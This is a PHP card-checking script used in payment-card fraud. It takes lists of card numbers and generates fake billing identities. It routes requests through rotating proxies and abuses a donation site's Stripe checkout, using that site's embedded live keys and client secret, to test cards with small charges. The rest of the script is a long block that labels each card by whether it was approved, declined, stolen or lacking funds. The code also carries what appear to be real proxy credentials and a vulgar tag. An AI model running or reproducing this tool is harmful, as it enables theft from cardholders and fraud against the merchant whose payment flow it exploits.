<?php 

//////////////////////[Raw Api for Braintree payment gateway #Reboot13]///////////////

error_reporting(0);
date_default_timezone_set('Asia/bangkok');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxy(){
    $proxy = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;

}
$proxy = rebootproxy();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$crawleraproxy = 'proxy.crawlera.com:8010';
$proxyauth = '92a7b8a4e0de4b829b914280cbb772ad:';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}

///////////////////////////////////////////////////=========[Luminati Details]

$username = 'username';
$password = 'password';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

///////////////////////////////////////////////////=========[Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://iowamost.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=asp_pp_req_token&amount=50&curr=USD&product_id=2406&quantity=1&billing_details={"name":"'.$firstname.'+'.$lastname.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"US","postal_code":"'.$zip.'"}}');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-language: th,en-US;q=0.9,en;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://iowamost.org';
$headers[] = 'Referer: https://iowamost.org/?asp_action=show_pp&product_id=2406';
$headers[] = 'Sec-Fetch-Mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"token":"','"')));

///////////////////////////////////////////////////=========[Charging Cards]

$ch = curl_init();
//////////======= LUMINATI
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_1H2lYvFsQus2ukkyr98kQjl9/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'save_payment_method=true&setup_future_usage=off_session&receipt_email='.$email.'&payment_method_data[type]=card&payment_method_data[billing_details][name]='.$firstname.'+'.$lastname.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][state]='.$state.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=7c4fd8dc-4a0e-4451-9446-5511c3372563&payment_method_data[muid]=c166de9b-4692-456d-9511-8c28c41a9931&payment_method_data[sid]=94a4ae4a-3932-444d-a59b-f36396dd2705&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fcb4a2485%3B+stripe-js-v3%2Fcb4a2485&payment_method_data[time_on_page]=16673&payment_method_data[referrer]=https%3A%2F%2Fiowamost.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D2406&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_dJikV5lIc1aNxi7ejgHfXinW00C9eTXXv2&client_secret=pi_1H2lYvFsQus2ukkyr98kQjl9_secret_yiSj8IMMsb6e8XE3S6nGx0c4H');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/v3/controller-4d6cb57062395cdaedb65051366140a7.html';
$headers[] = 'Sec-Fetch-Mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"cvv_result":{"code":"','"')));
$avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','"')));

////////////////////////////===[Card Response]

if(strpos($result, '"cvc_check": "pass"')){

  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>SUCCESS CHARGED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font  color='green'><font class='badge badge-warning'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-warning'>LOST CARD</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font  color='green'><font class='badge badge-warning'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-warning'>STOLEN CARD</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font  color='green'><font class='badge badge-light'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-light'>CCN MATCHED</i></font> <font class='badge badge-light'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font  color='green'><font class='badge badge-success'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-light'>CCN MATCHED</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font  color='green'><font class='badge badge-warning'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='green'><font class='badge badge-warning'>STOLEN OR LOST</i></font> <font class='badge badge-green'>[Info: My Big Black D1ck]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i></font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font  color='green'><font class='badge badge-warning'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-warning'>DO NOT HONOR</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font  color='green'><font class='badge badge-warning'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-warning'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result, 'Your card was declined.')) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CARD DECLINED</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result, '"cvc_check": "unchecked"')) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CVC UNCHECKED BEWARE !! !!!</i></font><br>";
  }
  elseif(strpos($result, '"cvc_check": "unavailable"')) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CVC UNCHECKED BEWARE !! !!!</i></font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-warning'>CVC_CHECKED : Fail</i></font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>MISSING CARD DETAIL</i></font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-warning'>CARD NOT CHECK</i></font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font  color='green'><font class='badge badge-red'>Aprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-brown'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>3D SECURED</i></font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i></font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i></font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font  color='green'><font class='badge badge-warning'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font  color='green'><font class='badge badge-warning'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'fraudulent')) {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>Fraudulent</i></font><br>";
}
else {
  echo "<font  color='green'><font class='badge badge-danger'>Reprovada 🐱‍👤⚡ƊƊ0ƝS⚡🐱‍👤 <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font  color='red'><font class='badge badge-danger'>Server Failure/Error Not Listed</i></font><br>";
}


curl_close($ch);
ob_flush();
?>